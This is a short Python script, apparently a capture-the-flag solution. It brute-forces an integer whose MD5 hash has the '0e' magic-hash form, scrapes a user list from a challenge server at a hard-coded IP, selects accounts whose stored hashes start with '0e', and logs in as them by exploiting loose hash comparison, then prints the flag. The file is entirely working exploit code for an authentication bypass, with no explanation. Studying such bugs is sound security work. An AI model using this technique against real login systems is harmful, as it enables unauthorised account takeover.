import requests
from bs4 import BeautifulSoup
import re
import hashlib
pattern = re.compile(r'^0e\d+$')
md5jugging = 0
for i in range(1, 1000000):
    result = hashlib.md5(str(i * 2 * 2 * 13 * 13).encode()).hexdigest()
    if pattern.match(result):
        print(f"Found {i} has an md5 hash starting with 0e: {result}")
        md5jugging = i
        break
    
url = "http://34.132.132.69:8000/?user=all"
response = requests.get(url).text
soup = BeautifulSoup(response, "html.parser")
user_list = []
rows = soup.find_all("tr")

for row in rows:
    td_tags = row.find_all("td")

    if (len(td_tags) >= 3) and (td_tags[2].text.startswith("0e")):
        user_dict = {
            'username': td_tags[1].text,
            'password': td_tags[2].text
        }
        user_list.append(user_dict)

for data in user_list:
    payload = {
        "username" : data["username"],
        "password" : f"{md5jugging}"
    }
    response = requests.post(url="http://34.132.132.69:8000/", data=payload).text
    if ("You win" in response):
        soup2 = BeautifulSoup(response, "html.parser")
        notification = soup2.find_all("td")
        for noti in notification:
            if ("flag" in noti.text):
                print(noti.text)       
                break